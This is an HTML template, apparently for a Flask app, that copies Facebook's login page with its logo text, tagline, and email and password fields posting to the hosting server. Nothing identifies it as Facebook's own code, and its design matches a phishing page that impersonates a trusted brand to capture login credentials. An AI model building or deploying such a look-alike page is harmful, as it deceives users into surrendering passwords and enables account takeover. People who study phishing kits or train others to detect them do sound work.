
<!DOCTYPE html>
<html>
<head>
    <title>Facebook</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='facebook.css') }}">
</head>
<body>
<div class="fb-container">
    <div class="fb-left">
        <div class="fb-logo">facebook</div>
        <div class="fb-subtext">Connect with friends and the world around you on Facebook.</div>
    </div>
    <div class="fb-form">
        <form method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <button type="submit" class="fb-create">Create new account</button>
        </form>
    </div>
</div>
</body>
</html>
